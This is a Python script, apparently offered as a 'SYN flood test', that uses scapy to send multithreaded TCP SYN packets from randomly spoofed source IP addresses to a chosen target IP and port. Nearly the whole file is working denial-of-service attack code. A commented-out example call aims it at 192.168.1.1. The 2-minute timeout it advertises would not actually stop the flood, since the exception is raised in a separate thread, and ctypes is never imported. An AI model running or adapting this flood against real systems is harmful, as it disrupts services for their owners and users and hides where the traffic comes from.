import threading
import random
import socket
import sys
import time
import os
from scapy.all import *

class TimeoutException(Exception):
    pass

def is_admin():
    """Check if the script is run as an administrator (works for both Windows and Unix/Linux)."""
    if os.name == 'nt':  # For Windows
        try:
            return ctypes.windll.shell32.IsUserAnAdmin()
        except Exception:
            return False
    else:  # For Unix/Linux
        return os.geteuid() == 0

def timeout_handler():
    time.sleep(120)  # Timeout after 2 minutes
    raise TimeoutException()

def check_target(target_ip, target_port):
    """Check if the target IP and port are reachable."""
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.settimeout(5)  # Set a timeout for the connection
        result = s.connect_ex((target_ip, target_port))
        if result != 0:
            raise ConnectionError(f"Target {target_ip}:{target_port} is unreachable.")

def syn_flood(target_ip, target_port, packets):
    for _ in range(packets):
        # Create IP and TCP layer for SYN Flood
        ip_layer = IP(src=f"{random.randint(1, 254)}.{random.randint(1, 254)}.{random.randint(1, 254)}.{random.randint(1, 254)}", dst=target_ip)
        tcp_layer = TCP(sport=random.randint(1024, 65535), dport=target_port, flags="S")
        
        packet = ip_layer / tcp_layer
        send(packet, verbose=False)  # Send SYN packet

def run_syn_flood_threads(target_ip, target_port, packets, threads):
    thread_list = []

    for _ in range(threads):
        thread = threading.Thread(target=syn_flood, args=(target_ip, target_port, packets))
        thread_list.append(thread)
        thread.start()

    for thread in thread_list:
        thread.join()

def syn_flood_test(target_ip, target_port, packets, threads):
    # Check if the script is run as an administrator
    if not is_admin():
        print("This script requires administrative privileges to run.")
        sys.exit(1)

    # Check if the target IP and port are reachable
    try:
        check_target(target_ip, target_port)
    except ConnectionError as e:
        print(e)
        sys.exit(1)

    # Start thread for timeout handler
    timeout_thread = threading.Thread(target=timeout_handler)
    timeout_thread.start()

    try:
        print("SYN flood test initiated with the following parameters:")
        print(f"Target IP: {target_ip}")
        print(f"Target Port: {target_port}")
        print(f"Packets per thread: {packets}")
        print(f"Number of threads: {threads}")
        
        run_syn_flood_threads(target_ip, target_port, packets, threads)
    except TimeoutException:
        print("\nTimeout! 2 minutes have passed.")
        sys.exit(0)
    except KeyboardInterrupt:
        print("\nTest canceled by user with CTRL + C")
        sys.exit(0)
    except Exception as e:
        print(f"An unexpected error occurred: {e}")
        sys.exit(1)

# syn_flood_test("192.168.1.1", 80, packets=100, threads=10)
